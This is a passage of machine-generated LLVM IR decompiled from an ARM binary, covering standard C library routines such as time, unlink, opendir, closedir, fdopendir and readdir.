  %v1_12fe4 = sub i32 0, %arg1
  %v3_12fe8 = load i16, i16* @global_var_24150.533, align 2
  %v4_12fe8 = sext i16 %v3_12fe8 to i32
  %v0_12fec = call i32 @__aeabi_read_tp()
  %v3_12ff0 = add i32 %v4_12fe8, %v0_12fec
  %v4_12ff0 = inttoptr i32 %v3_12ff0 to i32*
  store i32 %v1_12fe4, i32* %v4_12ff0, align 4
  br label %dec_label_pc_12ff8

dec_label_pc_12ff8:                               ; preds = %dec_label_pc_12fc4, %dec_label_pc_12fe0
  %v1_13000 = phi i32 [ %arg1, %dec_label_pc_12fc4 ], [ -1, %dec_label_pc_12fe0 ]
  ret i32 %v1_13000

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12ff8, { 1, 0 }
  uselistorder label %dec_label_pc_12fc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12fac, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_1300c = ptrtoint i32* %stack_var_-16 to i32
  %v2_1301c = call i32 @gettimeofday(i32 %v2_1300c, i32 0)
  %v2_13020 = load i32, i32* %stack_var_-16, align 4
  %v2_13024 = icmp eq i32* %arg1, null
  br i1 %v2_13024, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_13020, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_13020

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13038 = load i32, i32* @r7, align 4
  store i32 %v3_13038, i32* %stack_var_-8, align 4
  %v0_13044 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13044, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13044, -4095
  br i1 %tmp, label %dec_label_pc_1306c, label %dec_label_pc_13054

dec_label_pc_13054:                               ; preds = %entry
  %v0_13058 = call i32 @__aeabi_read_tp()
  %v3_1305c = load i16, i16* @global_var_24150.533, align 2
  %v4_1305c = sext i16 %v3_1305c to i32
  %v0_13060 = load i32, i32* %r2.global-to-local, align 4
  %v1_13060 = sub i32 0, %v0_13060
  store i32 %v1_13060, i32* %r2.global-to-local, align 4
  %v3_13064 = add i32 %v4_1305c, %v0_13058
  %v4_13064 = inttoptr i32 %v3_13064 to i32*
  store i32 %v1_13060, i32* %v4_13064, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1306c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1306c

dec_label_pc_1306c:                               ; preds = %entry, %dec_label_pc_13054
  %v1_13070 = phi i32 [ %v0_13044, %entry ], [ -1, %dec_label_pc_13054 ]
  %v2_1306c = phi i32 [ %v3_13038, %entry ], [ %v2_1306c.pre, %dec_label_pc_13054 ]
  store i32 %v2_1306c, i32* @r7, align 4
  ret i32 %v1_13070

; uselistorder directives
  uselistorder i32 %v0_13044, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1306c, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_13078 = load i32, i32* @r4, align 4
  store i32 %v3_13078, i32* %stack_var_-24, align 4
  %v9_13078 = load i32, i32* @r6, align 4
  %v12_13078 = load i32, i32* @r7, align 4
  %v15_13078 = load i32, i32* @r8, align 4
  %v18_13078 = load i32, i32* @lr, align 4
  %v2_1307c = load i32, i32* %arg1, align 4
  store i32 %v2_1307c, i32* %r3.global-to-local, align 4
  %v3_13084 = icmp eq i32 %v2_1307c, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r6, align 4
  br i1 %v3_13084, label %dec_label_pc_13098, label %dec_label_pc_130b4

dec_label_pc_13098:                               ; preds = %entry
  store i32 69800, i32* %r2.global-to-local, align 4
  %v0_1309c = call i32 @__aeabi_read_tp()
  %v3_130a0 = load i16, i16* @global_var_24150.533, align 2
  %v4_130a0 = sext i16 %v3_130a0 to i32
  store i32 %v4_130a0, i32* %r2.global-to-local, align 4
  %v0_130a4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_130a4, i32* %r1.global-to-local, align 4
  %v1_130a8 = add i32 %v0_130a4, 10
  store i32 %v1_130a8, i32* %r3.global-to-local, align 4
  %v3_130ac = add i32 %v4_130a0, %v0_1309c
  %v4_130ac = inttoptr i32 %v3_130ac to i32*
  store i32 %v1_130a8, i32* %v4_130ac, align 4
  %v0_1315c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1315c

dec_label_pc_130b4:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_130b8 = add i32 %tmp, 24
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v4_130c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 68) to i32*), align 4
  store i32 %v4_130c0, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_130cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_130cc)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_130e4 = load i32, i32* @r6, align 4
  %v2_130e4 = add i32 %v0_130e4, 16
  %v3_130e4 = inttoptr i32 %v2_130e4 to i32*
  %v4_130e4 = load i32, i32* %v3_130e4, align 4
  call void @__pseudo_branch(i32 %v4_130e4)
  %v0_130f0 = load i32, i32* @r7, align 4
  %v1_130f0 = inttoptr i32 %v0_130f0 to i32*
  %v2_130f0 = load i32, i32* %v1_130f0, align 4
  store i32 %v2_130f0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_13100 = load i32, i32* @r8, align 4
  store i32 %v0_13100, i32* %v1_130f0, align 4
  %v0_13104 = load i32, i32* @r6, align 4
  %v1_13104 = load i32, i32* %r3.global-to-local, align 4
  %v2_13104 = add i32 %v1_13104, %v0_13104
  %v3_13104 = inttoptr i32 %v2_13104 to i32*
  %v4_13104 = load i32, i32* %v3_13104, align 4
  store i32 ptrtoint (i32* @global_var_13110.566 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13104)
  %v0_13110 = load i32, i32* @r7, align 4
  %v1_13110 = add i32 %v0_13110, 12
  %v2_13110 = inttoptr i32 %v1_13110 to i32*
  %v3_13110 = load i32, i32* %v2_13110, align 4
  store i32 %v3_13110, i32* @r0, align 4
  %v0_13114 = call i32 @free()
  %v0_13118 = load i32, i32* @r7, align 4
  store i32 %v0_13118, i32* @r0, align 4
  %v0_1311c = call i32 @free()
  %v0_13124 = load i32, i32* @r4, align 4
  store i32 %v0_13124, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_13124, -4095
  br i1 %tmp11, label %dec_label_pc_13158, label %dec_label_pc_13140

dec_label_pc_13140:                               ; preds = %dec_label_pc_130b4
  store i32 69632, i32* %r3.global-to-local, align 4
  %v0_13144 = call i32 @__aeabi_read_tp()
  %v3_13148 = load i16, i16* @global_var_24150.533, align 2
  %v4_13148 = sext i16 %v3_13148 to i32
  store i32 %v4_13148, i32* %r3.global-to-local, align 4
  %v0_1314c = load i32, i32* %r2.global-to-local, align 4
  %v1_1314c = sub i32 0, %v0_1314c
  store i32 %v1_1314c, i32* %r2.global-to-local, align 4
  %v3_13150 = add i32 %v4_13148, %v0_13144
  %v4_13150 = inttoptr i32 %v3_13150 to i32*
  store i32 %v1_1314c, i32* %v4_13150, align 4
  %v0_13154 = load i32, i32* @r8, align 4
  br label %dec_label_pc_13158

dec_label_pc_13158:                               ; preds = %dec_label_pc_130b4, %dec_label_pc_13140
  %v0_13158 = phi i32 [ %v0_13124, %dec_label_pc_130b4 ], [ %v0_13154, %dec_label_pc_13140 ]
  store i32 %v0_13158, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1315c

dec_label_pc_1315c:                               ; preds = %dec_label_pc_13098, %dec_label_pc_13158
  %v0_1315c = phi i32 [ %v0_1315c.pre, %dec_label_pc_13098 ], [ %v0_13158, %dec_label_pc_13158 ]
  %v2_13164 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13164, i32* @r4, align 4
  store i32 %v9_13078, i32* @r6, align 4
  store i32 %v12_13078, i32* @r7, align 4
  store i32 %v15_13078, i32* @r8, align 4
  store i32 %v18_13078, i32* @lr, align 4
  ret i32 %v0_1315c

; uselistorder directives
  uselistorder i32 %v0_13124, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1315c, { 1, 0 }
  uselistorder label %dec_label_pc_13158, { 1, 0 }
}

define i32 @function_13174(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13174:
  %v0_13174 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13174, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13174
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13174, %bb
  %v4_13184 = phi i32 [ %arg1, %dec_label_pc_13174 ], [ 0, %bb ]
  ret i32 %v4_13184

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13188 = load i32, i32* @r4, align 4
  %v6_13188 = load i32, i32* @r5, align 4
  %v9_13188 = load i32, i32* @r6, align 4
  %v12_13188 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1319c = call i32 @malloc()
  %v2_131a4 = icmp eq i32 %v0_1319c, 0
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r6, align 4
  br i1 %v2_131a4, label %bb, label %dec_label_pc_131b4

bb:                                               ; preds = %entry
  br label %dec_label_pc_13240

dec_label_pc_131b4:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_131b8 = load i32, i32* @r4, align 4
  %v2_131b8 = icmp ugt i32 %v0_131b8, 511
  %v2_131bc = add i32 %v0_1319c, 4
  %v3_131bc = inttoptr i32 %v2_131bc to i32*
  store i32 0, i32* %v3_131bc, align 4
  %v0_131c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_131c0 = add i32 %v0_1319c, 16
  %v3_131c0 = inttoptr i32 %v2_131c0 to i32*
  store i32 %v0_131c0, i32* %v3_131c0, align 4
  %v0_131c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_131c4 = add i32 %v0_1319c, 8
  %v3_131c4 = inttoptr i32 %v2_131c4 to i32*
  store i32 %v0_131c4, i32* %v3_131c4, align 4
  br i1 %v2_131b8, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_131b4
  %v0_131cc2 = load i32, i32* @r4, align 4
  %v2_131cc3 = add i32 %v0_1319c, 20
  %v3_131cc4 = inttoptr i32 %v2_131cc3 to i32*
  store i32 %v0_131cc2, i32* %v3_131cc4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_131b4
  %v1_131c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_131c8 = add i32 %v1_131c8, 512
  store i32 %v2_131c8, i32* %r3.global-to-local, align 4
  %v0_131cc = load i32, i32* @r4, align 4
  %v2_131cc = add i32 %v0_1319c, 20
  %v3_131cc = inttoptr i32 %v2_131cc to i32*
  store i32 %v0_131cc, i32* %v3_131cc, align 4
  %v1_131d0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_131d0, i32* %v3_131cc, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_1319c, i32* @r5, align 4
  %v0_131d8 = load i32, i32* @r7, align 4
  %v2_131d8 = inttoptr i32 %v0_1319c to i32*
  store i32 %v0_131d8, i32* %v2_131d8, align 4
  %v0_131dc = load i32, i32* @r5, align 4
  %v1_131dc = add i32 %v0_131dc, 20
  %v2_131dc = inttoptr i32 %v1_131dc to i32*
  %v3_131dc = load i32, i32* %v2_131dc, align 4
  store i32 %v3_131dc, i32* %r1.global-to-local, align 4
  %v2_131e4 = call i32 @calloc(i32 1, i32 %v3_131dc)
  %v2_131e8 = icmp eq i32 %v2_131e4, 0
  store i32 %v2_131e4, i32* @r4, align 4
  %v1_131f0 = load i32, i32* @r5, align 4
  %v2_131f0 = add i32 %v1_131f0, 12
  %v3_131f0 = inttoptr i32 %v2_131f0 to i32*
  store i32 %v2_131e4, i32* %v3_131f0, align 4
  br i1 %v2_131e8, label %dec_label_pc_131f8, label %dec_label_pc_13208

dec_label_pc_131f8:                               ; preds = %bb17
  %v0_131f8 = load i32, i32* @r5, align 4
  store i32 %v0_131f8, i32* @r0, align 4
  %v0_131fc = call i32 @free()
  %v0_13200 = load i32, i32* @r4, align 4
  br label %dec_label_pc_13240

dec_label_pc_13208:                               ; preds = %bb17
  %v0_1320c = load i32, i32* @r6, align 4
  %v2_1320c = add i32 %v0_1320c, -34032
  store i32 %v2_1320c, i32* %r3.global-to-local, align 4
  %v1_13214 = inttoptr i32 %v2_1320c to i32*
  %v2_13214 = load i32, i32* %v1_13214, align 4
  %v3_13214 = add i32 %v0_1320c, -34028
  %v4_13214 = inttoptr i32 %v3_13214 to i32*
  %v5_13214 = load i32, i32* %v4_13214, align 4
  store i32 %v5_13214, i32* %r1.global-to-local, align 4
  %v6_13214 = add i32 %v0_1320c, -34024
  %v7_13214 = inttoptr i32 %v6_13214 to i32*
  %v8_13214 = load i32, i32* %v7_13214, align 4
  store i32 %v8_13214, i32* %r2.global-to-local, align 4
  %v9_13214 = add i32 %v0_1320c, -34020
  %v10_13214 = inttoptr i32 %v9_13214 to i32*
  %v11_13214 = load i32, i32* %v10_13214, align 4
  store i32 %v11_13214, i32* %r3.global-to-local, align 4
  %v12_13214 = add i32 %v0_1320c, -34016
  %v1_13220 = inttoptr i32 %v12_13214 to i32*
  %v2_13220 = load i32, i32* %v1_13220, align 4
  %v3_13220 = add i32 %v0_1320c, -34012
  %v4_13220 = inttoptr i32 %v3_13220 to i32*
  %v5_13220 = load i32, i32* %v4_13220, align 4
  store i32 %v2_13220, i32* %stack_var_-32, align 4
  store i32 %v5_13214, i32* %r1.global-to-local, align 4
  store i32 %v8_13214, i32* %r2.global-to-local, align 4
  store i32 %v11_13214, i32* %r3.global-to-local, align 4
  %v0_13230 = load i32, i32* @r5, align 4
  %v1_13230 = add i32 %v0_13230, 24
  %v1_13234 = inttoptr i32 %v1_13230 to i32*
  store i32 %v2_13214, i32* %v1_13234, align 4
  %v3_13234 = add i32 %v0_13230, 28
  %v4_13234 = inttoptr i32 %v3_13234 to i32*
  %v5_13234 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13234, i32* %v4_13234, align 4
  %v6_13234 = add i32 %v0_13230, 32
  %v7_13234 = inttoptr i32 %v6_13234 to i32*
  %v8_13234 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_13234, i32* %v7_13234, align 4
  %v9_13234 = add i32 %v0_13230, 36
  %v10_13234 = inttoptr i32 %v9_13234 to i32*
  %v11_13234 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_13234, i32* %v10_13234, align 4
  %v12_13234 = add i32 %v0_13230, 40
  %v2_13238 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_13220, i32* %r1.global-to-local, align 4
  %v1_1323c = inttoptr i32 %v12_13234 to i32*
  store i32 %v2_13238, i32* %v1_1323c, align 4
  %v3_1323c = add i32 %v0_13230, 44
  %v4_1323c = inttoptr i32 %v3_1323c to i32*
  %v5_1323c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1323c, i32* %v4_1323c, align 4
  %v0_13240.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13240

dec_label_pc_13240:                               ; preds = %bb, %dec_label_pc_131f8, %dec_label_pc_13208
  %v0_13240 = phi i32 [ 0, %bb ], [ %v0_13200, %dec_label_pc_131f8 ], [ %v0_13240.pre, %dec_label_pc_13208 ]
  store i32 %v3_13188, i32* @r4, align 4
  store i32 %v6_13188, i32* @r5, align 4
  store i32 %v9_13188, i32* @r6, align 4
  store i32 %v12_13188, i32* @r7, align 4
  ret i32 %v0_13240

; uselistorder directives
  uselistorder i32 %v2_131e4, { 1, 0, 2 }
  uselistorder i32 %v0_1319c, { 2, 1, 5, 0, 6, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 12, 18, 19, 0, 1, 2, 3, 8, 9, 4, 5, 13, 10, 14, 11, 15, 6, 16, 7, 17 }
  uselistorder label %dec_label_pc_13240, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_13258 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_13260 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_13290, label %dec_label_pc_13278

dec_label_pc_13278:                               ; preds = %entry
  %v0_1327c = call i32 @__aeabi_read_tp()
  %v3_13280 = load i16, i16* @global_var_24150.533, align 2
  %v4_13280 = sext i16 %v3_13280 to i32
  %v0_13284 = load i32, i32* %r2.global-to-local, align 4
  %v1_13284 = sub i32 0, %v0_13284
  store i32 %v1_13284, i32* %r2.global-to-local, align 4
  %v3_13288 = add i32 %v4_13280, %v0_1327c
  %v4_13288 = inttoptr i32 %v3_13288 to i32*
  store i32 %v1_13284, i32* %v4_13288, align 4
  br label %dec_label_pc_132b4

dec_label_pc_13290:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_13290 = icmp slt i32 %arg1, 0
  br i1 %v1_13290, label %dec_label_pc_132b4, label %dec_label_pc_13298

dec_label_pc_13298:                               ; preds = %dec_label_pc_13290
  store i32 %v2_13260, i32* @r1, align 4
  %v0_1329c = call i32 @fstat()
  %v1_132a0 = icmp slt i32 %v0_1329c, 0
  br i1 %v1_132a0, label %dec_label_pc_132a8, label %dec_label_pc_132bc

dec_label_pc_132a8:                               ; preds = %dec_label_pc_13298
  br label %dec_label_pc_132b4

dec_label_pc_132b4:                               ; preds = %dec_label_pc_132a8, %dec_label_pc_13290, %dec_label_pc_13278
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13300

dec_label_pc_132bc:                               ; preds = %dec_label_pc_13298
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_132c4 = load i32, i32* @r7, align 4
  %v3_132c8 = call i32 @__GI___fcntl_nocancel(i32 %v0_132c4, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_132d0 = load i32, i32* @r7, align 4
  %v2_132d4 = call i32 @fd_to_DIR(i32 %v0_132d0, i32 %tmp)
  store i32 %v2_132d4, i32* %r1.global-to-local, align 4
  %v2_132d8 = icmp eq i32 %v2_132d4, 0
  br i1 %v2_132d8, label %dec_label_pc_132e0, label %dec_label_pc_13300

dec_label_pc_132e0:                               ; preds = %dec_label_pc_132bc
  %v0_132f0 = call i32 @__aeabi_read_tp()
  %v3_132f4 = load i16, i16* @global_var_24150.533, align 2
  %v4_132f4 = sext i16 %v3_132f4 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_132fc = add i32 %v4_132f4, %v0_132f0
  %v4_132fc = inttoptr i32 %v3_132fc to i32*
  store i32 12, i32* %v4_132fc, align 4
  %v0_13300.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13300

dec_label_pc_13300:                               ; preds = %dec_label_pc_132bc, %dec_label_pc_132b4, %dec_label_pc_132e0
  %v0_13300 = phi i32 [ %v2_132d4, %dec_label_pc_132bc ], [ 0, %dec_label_pc_132b4 ], [ %v0_13300.pre, %dec_label_pc_132e0 ]
  store i32 %v3_13258, i32* @r7, align 4
  ret i32 %v0_13300

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_13300, { 2, 0, 1 }
}

define i32 @"$d.11"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13310:
  %v0_13310 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13310, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13310
  %v1_13310 = load i32, i32* @r8, align 4
  %v5_13310 = mul i32 %arg1, 65536
  %v6_13310 = and i32 %v1_13310, %v5_13310
  %v3_13318 = load i32, i32* @lr, align 4
  %v8_13318 = ashr i32 %v6_13310, %v3_13318
  %v9_13318 = and i32 %v8_13318, %arg2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13310, %bb
  %v10_13318 = phi i32 [ %arg1, %dec_label_pc_13310 ], [ %v9_13318, %bb ]
  ret i32 %v10_13318

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_13320 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_13320, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1332c = call i32 @fstat()
  store i32 %v0_1332c, i32* @r5, align 4
  %v2_13330 = icmp eq i32 %v0_1332c, 0
  br i1 %v2_13330, label %dec_label_pc_13338, label %dec_label_pc_133b0

dec_label_pc_13338:                               ; preds = %entry
  %v1_1333c = and i32 %tmp4, 61440
  store i32 %v1_1333c, i32* @r3, align 4
  %v7_13340 = icmp eq i32 %v1_1333c, 16384
  br i1 %v7_13340, label %dec_label_pc_13360, label %dec_label_pc_13348

dec_label_pc_13348:                               ; preds = %dec_label_pc_13338
  %v0_1334c = call i32 @__aeabi_read_tp()
  %v3_13350 = load i16, i16* @global_var_24150.533, align 2
  %v0_13354 = load i32, i32* @r5, align 4
  store i32 %v0_13354, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13394

dec_label_pc_13360:                               ; preds = %dec_label_pc_13338
  %v0_13360 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_13368 = call i32 @__libc_fcntl(i32 %v0_13360, i32 3)
  %v7_1336c = icmp eq i32 %v2_13368, -1
  br i1 %v7_1336c, label %dec_label_pc_133b0, label %dec_label_pc_13374

dec_label_pc_13374:                               ; preds = %dec_label_pc_13360
  %v1_13374 = urem i32 %v2_13368, 4
  store i32 %v1_13374, i32* %r3.global-to-local, align 4
  %v7_13378 = icmp eq i32 %v1_13374, 1
  br i1 %v7_13378, label %dec_label_pc_13380, label %dec_label_pc_1339c

dec_label_pc_13380:                               ; preds = %dec_label_pc_13374
  %v0_13384 = call i32 @__aeabi_read_tp()
  %v3_13388 = load i16, i16* @global_var_24150.533, align 2
  %v0_1338c = load i32, i32* @r5, align 4
  store i32 %v0_1338c, i32* %r1.global-to-local, align 4
  %v0_13390 = load i32, i32* %r3.global-to-local, align 4
  %v1_13390 = add i32 %v0_13390, 21
  br label %dec_label_pc_13394

dec_label_pc_13394:                               ; preds = %dec_label_pc_13348, %dec_label_pc_13380
  %v2_13394.in = phi i16 [ %v3_13350, %dec_label_pc_13348 ], [ %v3_13388, %dec_label_pc_13380 ]
  %v1_13394 = phi i32 [ %v0_1334c, %dec_label_pc_13348 ], [ %v0_13384, %dec_label_pc_13380 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_13348 ], [ %v1_13390, %dec_label_pc_13380 ]
  %v2_13394 = sext i16 %v2_13394.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_13394 = add i32 %v1_13394, %v2_13394
  %v4_13394 = inttoptr i32 %v3_13394 to i32*
  store i32 %storemerge, i32* %v4_13394, align 4
  %v0_133b4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_133b4

dec_label_pc_1339c:                               ; preds = %dec_label_pc_13374
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_133a0 = load i32, i32* @r4, align 4
  %v2_133a4 = call i32 @fd_to_DIR(i32 %v0_133a0, i32 %tmp)
  store i32 %v2_133a4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_133b4

dec_label_pc_133b0:                               ; preds = %entry, %dec_label_pc_13360
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_133b4

dec_label_pc_133b4:                               ; preds = %dec_label_pc_1339c, %dec_label_pc_13394, %dec_label_pc_133b0
  %v0_133b4 = phi i32 [ %v2_133a4, %dec_label_pc_1339c ], [ %v0_133b4.pre, %dec_label_pc_13394 ], [ 0, %dec_label_pc_133b0 ]
  ret i32 %v0_133b4

; uselistorder directives
  uselistorder i32 %v1_13374, { 1, 0 }
  uselistorder i32 %v2_13368, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 9, 1, 10, 2, 6, 3, 7, 4, 8, 11, 5, 0, 12 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_133b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_133b0, { 1, 0 }
  uselistorder label %dec_label_pc_13394, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_133cc = load i32, i32* @r4, align 4
  %v6_133cc = load i32, i32* @r5, align 4
  %v9_133cc = load i32, i32* @r6, align 4
  %v12_133cc = load i32, i32* @r7, align 4
  %v15_133cc = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r6, align 4
  %v1_133e0 = add i32 %tmp, 24
  store i32 %v1_133e0, i32* @r4, align 4
  %v4_133e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 68) to i32*), align 4
  store i32 %v4_133e4, i32* %r1.global-to-local, align 4
  store i32 %v1_133e0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_133f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_133f8)
  %v0_1340c = load i32, i32* @r6, align 4
  %v2_1340c = add i32 %v0_1340c, 16
  %v3_1340c = inttoptr i32 %v2_1340c to i32*
  %v4_1340c = load i32, i32* %v3_1340c, align 4
  store i32 %v4_1340c, i32* @ip, align 4
  store i32 78872, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1340c)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1341c

dec_label_pc_1341c:                               ; preds = %dec_label_pc_1344c, %entry
  %v0_1341c = load i32, i32* @r5, align 4
  %v1_1341c = add i32 %v0_1341c, 4
  %v2_1341c = inttoptr i32 %v1_1341c to i32*
  %v3_1341c = load i32, i32* %v2_1341c, align 4
  store i32 %v3_1341c, i32* %r2.global-to-local, align 4
  %v4_1341c = add i32 %v0_1341c, 8
  %v5_1341c = inttoptr i32 %v4_1341c to i32*
  %v6_1341c = load i32, i32* %v5_1341c, align 4
  %tmp10 = icmp ugt i32 %v6_1341c, %v3_1341c
  br i1 %tmp10, label %dec_label_pc_1344c, label %dec_label_pc_13428

dec_label_pc_13428:                               ; preds = %dec_label_pc_1341c
  %v1_13428 = inttoptr i32 %v0_1341c to i32*
  %v2_13428 = load i32, i32* %v1_13428, align 4
  %v1_1342c = add i32 %v0_1341c, 12
  %v2_1342c = inttoptr i32 %v1_1342c to i32*
  %v3_1342c = load i32, i32* %v2_1342c, align 4
  store i32 %v3_1342c, i32* %r1.global-to-local, align 4
  %v1_13430 = add i32 %v0_1341c, 20
  %v2_13430 = inttoptr i32 %v1_13430 to i32*
